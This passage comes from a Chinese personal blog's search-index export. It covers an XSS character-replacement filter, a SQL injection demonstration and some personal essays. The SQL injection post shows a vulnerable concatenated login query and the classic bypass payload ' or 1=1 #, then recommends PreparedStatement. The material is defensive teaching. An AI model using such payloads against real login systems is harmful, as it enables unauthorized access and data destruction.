可以看到我们的过滤器作用域为REQUES，匹配路径我们配置成/*，这样访问该网站的所有路径的请求都会走到我们的过滤器进行过滤。我们过滤器主要是做了字符匹配替换的操作。把XSS的半角字符替换成全角字符，主要其实过滤掉尖括号标签，让非法用户注入的html标签和js被破坏，页面提交重放后无法正常执行注入的html和js。 加上过滤器后我们重新运行网站，再次进行XSS注入测试。提交保存后，回到信息列表页面，底下两条是我们刚刚最新添加的文章，输入内容直接被显示出来了，url连接也无法注入了。原本的半角字符被替换成全角，所以xss被破坏就无法被执行了。上面的转换规则可以过滤掉一些简单的XSS注入，如果你的网站后台需要接受一个json格式的数据，提交的json数据里半角双引号会被转换成全角双引号，这时候就需要更加业务需求修改规则，比如对符号进行转义，而不是替换成全角。我们主要过滤的其实是尖括号标签，去掉头尾，一般的xss就会被破坏。 很多论坛网站的文章内容输入表单，一般都是用类似于UEditer的富文本框来接收用户的输入，会把用户输入的内容转义成html标签转义字符给后台，后台在存储到数据库中，由于数据库存放的已经是转义后的标签，这样就不用担心用户输入了html或者js等内容。保存的文章被查询出来时是被转义的字符，浏览器无法执行这个被转义的标签，而是当做字符串被转义成内容显示在网页上。这样就过滤了XSS攻击]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[什么是SQL注入]]></title>
    <url>%2Fd9130e7c%2F</url>
    <content type="text"><![CDATA[SQL注入在早期的互联网系统中很常见，大多数是因为程序员没有考虑到sql注入的问题，没有对sql语句的参数进行过滤而直接使用字符串拼接的方式来传值，这就给SQL注入造成了可能。 不能公开做违法乱纪的事，所以我自己写了个示例程序，来重现一下当时遇到的安全问题。首先是sql注入 简单的登录表单页面 执行登录验证操作的程序 数据库 启动Tomcat服务器，访问项目 输入用户名和密码，假设我们不知道密码，这里故意输错密码，随便输入一个错误的密码，点击登录 我们回到登录页面，测试一下sql注入 点击登录，发现登录成功！ 我们在不知道用户名和密码的情况下成功的登录到了登录成功后的页面，实现了sql注入。问题主要出在执行登录程序的数据库查询的sql语句1SELECT * FROM user WHERE username='"+userName+"' AND password='"+passWord+"'" 使用这种拼接的方式容易给攻击者注入的机会，这里拼接上我们传进来的用户名和密码，我在登录表单那里输入的数据拼接进来后变成这样1SELECT * FROM user WHERE username='' or 1=1 #' AND password='1234567890' 可以看到前面的符号 ‘ 把我们把用户名值切断掉，让数据库查询条件变成查询用户名为空字符串的，此时数据库虽然没有匹配的记录，但是我们在后面再拼接上 or 1=1 这样就可以把数据库中user表的所有记录都查询出来，然后输入#号会把后面的sql语句都注释掉不执行最终执行的sql语句变成这样：1SELECT * FROM user WHERE username='' or 1=1 我们成功注入 or 1=1 并且跳转到登录成功后的页面，这种注入还可以让我们执行任意sql语句，比如执行删除语句把整个数据库数据都删除！ 如果程序中的sql拼接改成这样1SELECT * FROM user WHERE username="+userName+" AND password="+passWord 那我们的sql注入就需要多加个’号1'' or 1=1 # 对应mysql数据库，注释符是用#号，如果是其他数据库，比如SQL Server数据库，我们要使用两个 - 符号即可注释掉后面的sql语句。sql拼接的这种语句很容易让攻击者注入，只需要多试几次就可以实现注入。 为了防止这种常见的低级注入，我们不要使用拼接sql的方式来查询数据库。我发现目前的教科书和学校教的web编程课程中都没有提到类似的安全性问题，为了便于学生理解，很多都是使用sql拼接，我觉得关于web安全这点在学习过程中一定要时刻注意，防止犯一些低级错误。要始终牢记，用户的输入永远都是不可信的，一定要做校验和转换。像hibernate这类ORM框架已经替我们实现好了这一点，如果要自己用jdbc写的话，建议使用PreparedStatement进行传参数的方式防止sql注入。从网络安全的角度去思考问题，有助于开发出比较健壮相对比较安全的网站。对提高自身编程水平也是有帮助的。如果从事web开发，这种安全问题其实也是必须要指定并且尽量去避免的。框架虽然帮我们实现了这些功能但是我们还是要去学习他，我们可以学习框架的设计思想，达到提高自己的目的。比较常见的web攻击除了sql注入，还有xss等。我在后续的文章中会讲到。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编程是一种信仰]]></title>
    <url>%2Fe8cdb82b%2F</url>
    <content type="text"><![CDATA[今天是2017年12月1日，是一个月新的开始。同时，今天也是星期五，一周的结束。距离2018年仅有1个月的时间，回望一下即将过去的2017年，这里做一下总结。大学主攻Java，搞了3年的Android应用开发。从Android 2.3一直到Android7.0版本，Android开发工具也从Eclipse转移到了AndroidStudio，用AndroidStudio开发过项目的人都知道，这是Google官方推荐的专业Android开发工具，他基于IntelliJ IDEA开发，并且使用Gradle来构建项目，需要的第三方库只需要加入依赖即可，毋庸置疑这是一款非常专业的开发工具，直到2017年1月份我仍然在使用AndroidStudio来开发学习最新的Android7.0新特性。大学期间除了主攻的Java外，学校还上了很多课程，比如c、c#、ASP.NET、SQL Server等，另外自己还买来Python的书，还有树莓派、Arduino等，中间还折腾过Unity3，AR增强现实，遥控小车等……大学基本在学校的工作室度过的,所以有大把的时间进行折腾，可以说我的大学生活过的很充实。随着应用市场的饱和，基本已经不缺日常的App应用了，除了可以自己开发日常使用的工具类App，剩下的android开发需求基本都在外包和产品上了。Java的主要市场地位其实是在Web应用开发领域，之前我一直想从事Java Web开发却一直没有机会，写了多年的移动端，每次和后台对接口，解析别人定义好的数据格式，我是满满的羡慕，业务的核心基本都是在后端，希望自己能写服务端，能够成为定制规则的人。一次机缘巧合的机会，我们工作室刚好缺少Java Web开发的人员，Android开发的人倒是一大堆。所以我就跟我们工作室老师说我想从事Java Web开发。从第一个园区项目开始到现在为止，我已经参与做了几个Web项目了，其中走过了不少坑，也学习到了很多。开发基本都是靠自学，毋庸置疑 编程的知识需要靠自己去学，如果要学好它要自己去专研，通过看教学视频可以短期内提高认知水平，但还是远远不够的，需要多写多练习，学习别人的编程思想。Java web开发刚开始时，我和传统的学法一样，不管技术过不过时，之前有没有学过，全部重新先过一遍，从最基础的 html、css、js、jQuery、jsp、servlet、jdbc到框架Spring、Spring MVC、Hibernate都过了一遍，不敢说全部掌握，但是开发项目已经不成问题。搞开发仅仅会编程还是不够的，还要掌握各种工具和方法，比如Maven和Gradle构建，svn和git版本控制等，尤其是web开发，最好要有扎实的数据库功底，对解决各种优化查询 并非查询的问题 真的很有用。我很欣慰之前有扎实的Java功底，这些对我来说只是知识储备量的问题，但Java Web要学的还有很多，这时候千万不能停止学习的脚步。最近我在学习当前比较主流的技术 Vue、SpringBoot、Mybatis、Srping Cloud 分布式等。我的毕设决定做一个分布式API网关，从原先的Java Web入门小白到能够自己去发现知识运用知识，我用了将近快一年，虽然还不是很优秀，但是我感到很充实。编程就像是我的信仰一样，驱使着我不断前行。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[魔方的艺术]]></title>
    <url>%2Ffa5a2a73%2F</url>
    <content type="text"><![CDATA[最近喜欢上了玩魔方，因为魔方还原的步骤就像编程，魔方SDK的魅力促使我特意买了2到5阶的魔方，准备训练一下自己的逻辑思维能力。玩魔方和学编程一样，快速的入门方法就是看操作手册，目标导向有助于一个好的开始，通过研究别人的魔方还原步骤，我成功的还原了整个3阶魔方。魔方，英文名为Bubik’s Cube,魔方是在1974年匈牙利布达佩斯建筑学院厄尔诺·鲁比克教授发明的，所以又叫做鲁比克方块。魔方的发明最初是为了帮助学生认知空间立方体的组成结构，锻炼学生的记忆能力和空间思维能力。现如今已经发展成为一种手部极限运动，魔方是一项智力运动。 魔方背后的数学是群论，魔方被打乱的变化总数为 4.3X10^19 ，目前人类还原三阶魔方的世界纪录是4.59秒，而专门的魔方机器人则可以1秒还原，理论上可以更快。很多魔方高手都有自己还原魔方的一些算法，但是最快的算法是21步以内还原。通过计算机计算得到的魔方还原步骤可知，被打乱的任何三阶魔方理论上都可以通过21步以内还原。 为了学习魔方，我特意买了2345阶的魔方。 把三阶魔方打乱，还原前。 还原后 还原魔方可以练小脑，可以用不同的解法多加训练，提高自己的空间思维能力和记忆力。在还原魔方的过程中，在我看来就像是在做软件工程。首先分析需求，我们要做的就是还原魔方的6个面。套用别人的步骤公式来还原魔方，就像是编程中看别人的api文档来开发一样。目标为导向就是为了解决问题得到预期目标结果，在每次还原魔方的工程中我们用了一些不理解的步骤，可以先不用理会他，照做就是。最后我们成功的还原了魔方，达到最终目标。当然，练习小脑不仅仅是套用公式来达到肌肉记忆，我们还应该去专研还原步骤的逻辑原理，提高我们的认知和记忆能力，在掌握某个编程语言的api后，我们应该深入底层，掌握核心原理。毫无疑问，魔方SDK可以提高我们的思维能力，是人脑理解编程的一种方式。魔方是一种艺术！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[年轻的战场]]></title>
    <url>%2Fb1d4025b%2F</url>
    <content type="text"><![CDATA[你好，世界！我是蓝士钦。这是一篇简单的开始，我会好好努力，书写精彩的自己。站在这年轻的战场，我怀揣一个坚定的信仰，未来的远方在召唤，前行的路还很漫长，请多多指教。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
</search>
